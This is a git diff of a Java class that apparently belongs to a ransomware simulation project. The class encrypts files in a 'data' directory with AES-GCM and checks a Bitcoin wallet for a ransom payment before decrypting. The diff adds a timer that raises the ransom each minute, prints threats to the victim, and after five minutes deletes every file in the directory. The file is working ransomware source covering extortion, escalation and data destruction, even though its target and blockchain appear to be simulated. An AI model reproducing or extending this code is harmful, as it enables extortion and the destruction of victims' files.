@@ -13,29 +13,25 @@ import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Paths;
 import java.security.NoSuchAlgorithmException;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Objects;
+import java.util.*;
 
-public class Report implements IReport{
+public class Report implements IReport {
     // AES - Cryptography Params
     private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
     private static final int TAG_LENGTH_BIT = 128;
     private static final int IV_LENGTH_BYTE = 12;
     private static final int AES_KEY_BIT = 256;
     private static final Charset UTF_8 = StandardCharsets.UTF_8;
-    private SecretKey secretKey;
-    private byte[] nonce;
-
-    private boolean isEncrypted;
-
-    // Ransomware Params
-    private File directory;
-    private double ransomAmount;
-
     // Attacker
     private final Wallet wallet;
     private final double initialBalance;
+    private SecretKey secretKey;
+    private byte[] nonce;
+    private boolean isEncrypted;
+    // Ransomware Params
+    private final File directory;
+    private double ransomAmount;
+    private int minute;
 
 
     public Report() {
@@ -44,6 +40,7 @@ public class Report implements IReport{
         initialBalance = wallet.getBalance();
 
         this.ransomAmount = 0.02755;
+        this.minute = 0;
 
         // Path of dedicated directory
         this.directory = new File(String.valueOf(Paths.get("data").toAbsolutePath()));
@@ -55,9 +52,37 @@ public class Report implements IReport{
         }
     }
 
+    public static byte[] encrypt(byte[] pText, SecretKey secret, byte[] iv) throws Exception {
+
+        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
+        cipher.init(Cipher.ENCRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
+        return cipher.doFinal(pText);
+    }
+
+    public static byte[] decrypt(byte[] cText, SecretKey secret, byte[] iv) throws Exception {
+
+        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
+        cipher.init(Cipher.DECRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
+        return cipher.doFinal(cText);
+    }
+
+    private static byte[] readContentIntoByteArray(File file) {
+        FileInputStream fileInputStream;
+        byte[] bFile = new byte[(int) file.length()];
+        try {
+            //convert file into byte[]
+            fileInputStream = new FileInputStream(file);
+            fileInputStream.read(bFile);
+            fileInputStream.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return bFile;
+    }
+
     @Override
     public void checkPayment() throws Exception {
-        if(isEncrypted) {
+        if (isEncrypted) {
             if ((wallet.getBalance() >= (this.initialBalance + ransomAmount)) && Network.getInstance().isChainValid()) {
                 System.out.println("transaction successful! Your files will be decrypted.");
                 startDecryption();
@@ -130,43 +155,40 @@ public class Report implements IReport{
         }
     }
 
-
-    public static byte[] encrypt(byte[] pText, SecretKey secret, byte[] iv) throws Exception {
-
-        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
-        cipher.init(Cipher.ENCRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
-        return cipher.doFinal(pText);
-    }
-
-
-    public static byte[] decrypt(byte[] cText, SecretKey secret, byte[] iv) throws Exception {
-
-        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
-        cipher.init(Cipher.DECRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
-        return cipher.doFinal(cText);
-    }
-
-
-    private static byte[] readContentIntoByteArray(File file)
-    {
-        FileInputStream fileInputStream;
-        byte[] bFile = new byte[(int) file.length()];
-        try
-        {
-            //convert file into byte[]
-            fileInputStream = new FileInputStream(file);
-            fileInputStream.read(bFile);
-            fileInputStream.close();
-        }
-        catch (Exception e)
-        {
-            e.printStackTrace();
-        }
-        return bFile;
-    }
-
     private void startTimer() {
+        Timer timer = new Timer();
 
+        timer.schedule(new TimerTask() {
+            public void run() {
+                switch (minute) {
+                    case 1, 2, 3 -> {
+                        setRansomAmount(ransomAmount + 0.01);
+                        System.out.format("Amount to pay increased by 0,01 to %.5f BTC.\n", ransomAmount);
+                    }
+                    case 4 -> {
+                        setRansomAmount(ransomAmount + 0.01);
+                        System.out.format("Pay %.5f BTC immediately or your files will be irrevocably deleted.\n", ransomAmount);
+                    }
+                    case 5 -> {
+                        System.out.println("Now your files will be irrevocably deleted.");
+                        deleteAllFiles();
+                        System.exit(0);
+                    }
+                    default -> {
+                    }
+                }
+                minute++;
+            }
+        }, 0, 60 * 1000);
+    }
+
+    private void deleteAllFiles() {
+
+        List<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(directory.listFiles())));
+
+        for (File f : files) {
+            f.delete();
+        }
     }
 
 
